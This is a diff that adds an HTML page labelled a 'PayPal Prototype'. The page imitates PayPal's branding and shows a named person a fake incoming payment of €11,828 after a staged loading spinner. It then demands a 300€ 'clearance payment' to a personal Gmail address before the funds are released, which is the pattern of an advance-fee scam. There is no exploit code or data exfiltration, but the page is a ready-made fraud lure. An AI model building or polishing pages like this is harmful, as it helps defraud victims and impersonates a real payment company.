@@ -1,0 +1,167 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>PayPal Prototype</title>
+
+  <style>
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background: linear-gradient(135deg, #003087, #009cde);
+      height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .container {
+      background: white;
+      color: black;
+      width: 350px;
+      padding: 25px;
+      border-radius: 12px;
+      box-shadow: 0 8px 25px rgba(0,0,0,0.2);
+      text-align: center;
+    }
+
+    .logo {
+      width: 120px;
+      margin-bottom: 10px;
+    }
+
+    input {
+      width: 90%;
+      padding: 10px;
+      margin: 10px 0;
+      border-radius: 6px;
+      border: 1px solid #ccc;
+    }
+
+    button {
+      padding: 12px;
+      width: 95%;
+      background: #0070ba;
+      color: white;
+      border: none;
+      border-radius: 6px;
+      font-size: 16px;
+      cursor: pointer;
+    }
+
+    button:hover {
+      background: #005ea6;
+    }
+
+    #box {
+      display: none;
+      margin-top: 20px;
+      background: #f5f7fa;
+      padding: 15px;
+      border-radius: 8px;
+    }
+
+    #request {
+      color: #0070ba;
+      cursor: pointer;
+      margin-top: 10px;
+    }
+
+    #loader {
+      display: none;
+      margin-top: 20px;
+    }
+
+    .spinner {
+      border: 4px solid #eee;
+      border-top: 4px solid #0070ba;
+      border-radius: 50%;
+      width: 30px;
+      height: 30px;
+      animation: spin 1s linear infinite;
+      margin: auto;
+    }
+
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+
+    .fade {
+      animation: fadeIn 1s ease-in-out;
+    }
+
+    @keyframes fadeIn {
+      from { opacity: 0; }
+      to { opacity: 1; }
+    }
+
+    .small-text {
+      font-size: 14px;
+      margin-top: 15px;
+    }
+  </style>
+</head>
+
+<body>
+
+  <div class="container">
+
+    <img src="https://www.paypalobjects.com/webstatic/icon/pp258.png" class="logo">
+
+    <h3>Welcome Aris Groenendijk</h3>
+
+    <p id="transactionText" style="display:none;" class="fade">
+      Incoming transaction of €11,828
+    </p>
+
+    <div id="loader">
+      <p>Processing incoming payment...</p>
+      <div class="spinner"></div>
+    </div>
+
+    <h3>Enter Code</h3>
+
+    <input type="text" id="codeBox" placeholder="Enter code">
+    <br>
+
+    <button onclick="checkCode()">Submit</button>
+
+    <p id="result"></p>
+    <p id="request"></p>
+
+    <div id="box">
+      <h3>Your funds will be credited to your PayPal address ✅</h3>
+      <p>Your balance: €11,828</p>
+    </div>
+
+    <p class="small-text">
+      Clearance payment of 300€ for transaction to be verified and credited to this account arisschuurtje@gmail.com
+    </p>
+
+  </div>
+
+  <script>
+    window.onload = function() {
+      document.getElementById("loader").style.display = "block";
+
+      setTimeout(() => {
+        document.getElementById("loader").style.display = "none";
+        document.getElementById("transactionText").style.display = "block";
+      }, 2500);
+    }
+
+    function checkCode() {
+      let code = document.getElementById("codeBox").value;
+
+      if (code === "8421") {
+        document.getElementById("result").innerText = "Correct code ✅";
+        document.getElementById("request").innerText = "";
+        document.getElementById("box").style.display = "block";
+      } else {
+        document.getElementById("result").innerText = "Wrong code ❌";
+        document.getElementById("request").innerHTML = "<u>Request new code</u>";
+      }
+    }
+  </script>
+
+</body>
+</html>
